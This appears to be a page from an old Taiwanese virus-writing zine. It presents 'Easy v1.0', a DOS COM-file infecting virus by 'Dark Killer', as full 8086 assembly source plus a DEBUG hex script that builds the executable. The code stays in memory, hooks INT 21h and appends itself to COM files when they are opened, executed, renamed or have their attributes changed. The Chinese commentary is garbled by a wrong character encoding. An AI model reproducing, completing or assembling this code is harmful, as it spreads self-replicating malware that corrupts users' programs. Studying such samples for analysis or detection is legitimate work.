
                                                                     P.004

         TpVOtPVoTpvOTpVOtpVoTPvOTPVOtpVOTPvOtPVOtPVOtPvOTPvOTpVoTPVO
         PT                                                        OT
         VP     ¥x ÆW «Â ¤O ¯f ¬r ²Õ Â´   ¯f¬rÂø»x   ²Ä ‘C ´Á      TP
         oV                                                        PV
         TO                Ææ  Easy v1.0 ¯f¬r  Ææ                  Vo
         pT                                                        OT
         VP                    by Dark Killer                      VP
         OV                                                        OV
         OVTPVoTpvOtPvoTPVOtPvoTpVotpvoTpVotpvOtPvoTpVOtpvOTPvOTpvOTP


        ==============================================================

        Easy V1.0 , Written by Dark Killer.

        ³o¤@¬r¼gªº«D±`ªº Easy... ¤j®a¥i¥H¬Ý¬Ý... ³o°¦¬r­Y³Q
        DS ¬Ý¨ì¤@©w·|... ¦]¬°§Û Connie 3.0 ªº I/O Âà¦V...
        ¼K¼K... Bug ¬OÀ³¸Ó¦³¡A¬Ý¤@¤U­þ¦³°ÝÃD...

        ¥»¨Ó·Q¼gÁôÂÃ, ¦]¬° Mark ªºÃö«Y... ¦³¤@ÂI°ÝÃD... ©Ò
        ¥H´N¨ú®ø¤F...

        ™A°l Int 21h ­ì©l¤¤Â_ÂI
        ™B¿Ã¹õ IO Âà¦V (§Û Connie 3.0... §O¥´§Ú...)
        ™C¥Î¤F¤@¨Ç SFT ªº§Þ¥©...

========================================================================
                .286c
code            segment
                assume  cs:code,ds:code,es:code,ss:code
                org     0000h

vir_len         equ     offset vir_end-offset vir_start
vir_para        equ     (vir_len+0fh)/10h

start:
vir_start:
                call    delta1
delta1:
                call    delta2
delta2:
                mov     bp,sp
                mov     si,word ptr [bp+02h]
                sub     si,offset delta1
                add     sp,0004h

                mov     ax,9fe8h
                int     21h
                cmp     ax,0e89fh
                jne     install
run_com:
                push    cs
                pop     ds
                push    ss
                pop     es
                add     si,offset head_read
                mov     di,0100h
                push    ss
                push    di
                cld
                movsw
                movsw
                push    ss
                pop     ds
                retf
install:
                mov     ah,52h
                int     21h
                mov     bx,es:[bx-02h]
                xor     di,di
mcb_loop1:
                mov     es,bx
                add     bx,es:[di+03h]
                inc     bx
                cmp     byte ptr es:[di],"Z"
                jne     mcb_loop1
mcb_loop2:
                mov     ax,es
                mov     es,bx
                cmp     byte ptr es:[di],"M"
                mov     es,ax
                jne     mcb_ok
mcb_loop3:
                mov     es,bx
                add     bx,es:[di+03h]
                inc     bx
                cmp     byte ptr es:[di],"Z"
                jne     mcb_loop3
mcb_ok:
                sub     word ptr es:[di+03h],vir_para
                mov     ax,es
                add     ax,es:[di+03h]
                mov     es,ax
                mov     cx,vir_len
                push    es
                push    offset con
                cld
                rep     movsb
                retf
con:
                push    00h
                pop     ds
                cli
                mov     ax,offset newint21h
                xchg    word ptr ds:[0084h],ax
                mov     word ptr cs:oldint21h,ax
                mov     word ptr cs:entint21h,ax
                mov     ax,cs
                xchg    word ptr ds:[0086h],ax
                mov     word ptr cs:oldint21h+0002h,ax
                mov     word ptr cs:entint21h+0002h,ax
                call    trace_int21h
                xor     si,si
                jmp     run_com

trace_int21h    proc    near
                pushf
                pusha
                push    ds
                push    es

                mov     ah,52h
                int     21h
                mov     cx,0fff0h
                xor     di,di
                mov     al,90h
trace_int21h_loop1:
                repne   scasb
                jcxz    trace_int21h_exit
                scasb
                jne     trace_int21h_loop1
                cmp     word ptr es:[di],0cce8h
                jne     trace_int21h_loop1
                cmp     word ptr es:[di+03h],0ff2eh
                jne     trace_int21h_loop1
                cmp     byte ptr es:[di+05h],2eh
                jne     trace_int21h_loop1
                mov     di,word ptr es:[di+06h]
                les     di,dword ptr es:[di]
                mov     word ptr cs:entint21h,di
                mov     word ptr cs:entint21h+0002h,es

                mov     al,06h
                mov     cx,0030h
trace_int21h_loop2:
                repne   scasb
                jcxz    trace_int21h_exit
                cmp     byte ptr es:[di],1eh
                jne     trace_int21h_loop2
                dec     di
                mov     word ptr cs:entint21h,di
trace_int21h_exit:
                pop     es
                pop     ds
                popa
                popf
                ret
trace_int21h    endp

msg             db      "[Easy 1.0] Virus by Dark Killer in TPVO.",00h
head_read       db      0cdh,20h,?,?
head_write      db      0f5h,0e9h,?,?
oldint21h       dd      ?
entint21h       dd      ?
newint21h       proc    far
                pushf
                cmp     ax,9fe8h
                je      @9fe8
                cmp     ah,3dh
                je      infect
                cmp     ah,4bh
                je      infect
                cmp     ah,43h
                je      infect
                cmp     ah,56h
                je      infect
jump_int21h:
                popf
                jmp     dword ptr cs:oldint21h
@9fe8:
                popf
                xchg    ah,al
                iret
infect:
                pusha
                push    ds
                push    es

                mov     ax,3d00h
                call    callint21h
                jc      infect_exit0
                xchg    bx,ax

                push    bx
                mov     ax,1220h
                int     2fh
                mov     ax,1216h
                xor     bh,bh
                mov     bl,es:[di]
                int     2fh
                pop     bx

                or      word ptr es:[di+02h],0002h
                mov     al,byte ptr es:[di+04h]
                push    ax
                mov     byte ptr es:[di+04h],00h
                or      word ptr es:[di+05h],4000h

                cmp     word ptr es:[di+28h],"OC"
                jne     infect_exit1
                cmp     byte ptr es:[di+2ah],"M"
                jne     infect_exit1

                push    cs
                pop     ds
                mov     ah,3fh
                mov     cx,0004h
                mov     dx,offset head_read
                call    callint21h

                mov     ax,word ptr es:[di+11h]
                mov     word ptr es:[di+15h],ax
                sub     ax,0004h
                mov     word ptr head_write+0002h,ax

                cmp     word ptr head_read,0e9f5h
                je      infect_exit1

                mov     ah,40h
                mov     cx,vir_len
                mov     dx,offset vir_end
                call    write

                push    00h
                pop     word ptr es:[di+15h]

                mov     ah,40h
                mov     cx,0004h
                mov     dx,offset head_write
                call    write
infect_exit1:
                pop     ax
                mov     byte ptr es:[di+04h],al
                mov     ah,3eh
                call    callint21h
infect_exit0:
                pop     es
                pop     ds
                popa
                jmp     jump_int21h
newint21h       endp

callint21h      proc    near
                pushf
                call    dword ptr cs:entint21h
                ret
callint21h      endp

write           proc    near
                pushf
                pusha
                push    es
                mov     ax,1220h
                int     2fh
                push    word ptr es:[di]
                mov     ax,1220h
                xor     bx,bx
                int     2fh
                pop     ax
                mov     ah,al
                xchg    word ptr es:[di],ax
                push    ax
                mov     si,dx
                cld
write_loop:
                lodsb
                xchg    dx,ax
                cmp     dl,0ffh
                mov     ah,06h
                jne     write_not_ff
                mov     ah,02h
write_not_ff:
                call    callint21h
                loop    write_loop
                pop     es:[di]
                pop     es
                popa
                popf
                ret
write           endp

vir_end:

code            ends
                end     start
========================================================================

n easy10.com
e 0100 E8 00 00 E8 00 00 8B EC 8B 76 02 81 EE 03 00 83
e 0110 C4 04 B8 E8 9F CD 21 3D 9F E8 75 13 0E 1F 16 07
e 0120 81 C6 20 01 BF 00 01 16 57 FC A5 A5 16 1F CB B4
e 0130 52 CD 21 26 8B 5F FE 33 FF 8E C3 26 03 5D 03 43
e 0140 26 80 3D 5A 75 F3 8C C0 8E C3 26 80 3D 4D 8E C0
e 0150 75 0D 8E C3 26 03 5D 03 43 26 80 3D 5A 75 F3 26
e 0160 83 6D 03 22 8C C0 26 03 45 03 8E C0 B9 1E 02 06
e 0170 68 77 00 FC F3 A4 CB 6A 00 1F FA B8 30 01 87 06
e 0180 84 00 2E A3 28 01 2E A3 2C 01 8C C8 87 06 86 00
e 0190 2E A3 2A 01 2E A3 2E 01 E8 05 00 33 F6 E9 7C FF
e 01A0 9C 60 1E 06 B4 52 CD 21 B9 F0 FF 33 FF B0 90 F2
e 01B0 AE E3 3F AE 75 F9 26 81 3D E8 CC 75 F2 26 81 7D
e 01C0 03 2E FF 75 EA 26 80 7D 05 2E 75 E3 26 8B 7D 06
e 01D0 26 C4 3D 2E 89 3E 2C 01 2E 8C 06 2E 01 B0 06 B9
e 01E0 30 00 F2 AE E3 0C 26 80 3D 1E 75 F6 4F 2E 89 3E
e 01F0 2C 01 07 1F 61 9D C3 5B 45 61 73 79 20 31 2E 30
e 0200 5D 20 56 69 72 75 73 20 62 79 20 44 61 72 6B 20
e 0210 4B 69 6C 6C 65 72 20 69 6E 20 54 50 56 4F 2E 00
e 0220 CD 20 00 00 F5 E9 00 00 00 00 00 00 00 00 00 00
e 0230 9C 3D E8 9F 74 1A 80 FC 3D 74 19 80 FC 4B 74 14
e 0240 80 FC 43 74 0F 80 FC 56 74 0A 9D 2E FF 2E 28 01
e 0250 9D 86 E0 CF 60 1E 06 B8 00 3D E8 87 00 72 7F 93
e 0260 53 B8 20 12 CD 2F B8 16 12 32 FF 26 8A 1D CD 2F
e 0270 5B 26 83 4D 02 02 26 8A 45 04 50 26 C6 45 04 00
e 0280 26 81 4D 05 00 40 26 81 7D 28 43 4F 75 46 26 80
e 0290 7D 2A 4D 75 3F 0E 1F B4 3F B9 04 00 BA 20 01 E8
e 02A0 42 00 26 8B 45 11 26 89 45 15 2D 04 00 A3 26 01
e 02B0 81 3E 20 01 F5 E9 74 1C B4 40 B9 1E 02 BA 1E 02
e 02C0 E8 28 00 6A 00 26 8F 45 15 B4 40 B9 04 00 BA 24
e 02D0 01 E8 17 00 58 26 88 45 04 B4 3E E8 06 00 07 1F
e 02E0 61 E9 66 FF 9C 2E FF 1E 2C 01 C3 9C 60 06 B8 20
e 02F0 12 CD 2F 26 FF 35 B8 20 12 33 DB CD 2F 58 8A E0
e 0300 26 87 05 50 8B F2 FC AC 92 80 FA FF B4 06 75 02
e 0310 B4 02 E8 CF FF E2 F0 26 8F 05 07 61 9D C3
rcx
21E
w
q
